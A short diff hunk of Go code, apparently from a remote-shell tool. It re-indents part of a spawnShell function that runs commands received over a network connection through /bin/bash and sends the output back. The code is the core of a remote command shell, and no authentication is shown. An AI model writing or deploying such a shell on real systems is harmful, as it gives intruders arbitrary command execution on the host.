@@ -40,11 +40,11 @@ func spawnShell(conn net.Conn) {
 		}
 
 		cmd := exec.Command("/bin/bash", "-c", string(input))
-        cmd.Stdout = conn
-        cmd.Stderr = conn
-        if err := cmd.Run(); (handleError(err) == 1) {
-            fmt.Fprintf(conn, "❌ Error executing command: %v\n", err)
-        }
+		cmd.Stdout = conn
+		cmd.Stderr = conn
+		if err := cmd.Run(); (handleError(err) == 1) {
+			fmt.Fprintf(conn, "❌ Error executing command: %v\n", err)
+		}
 	}
 }
 
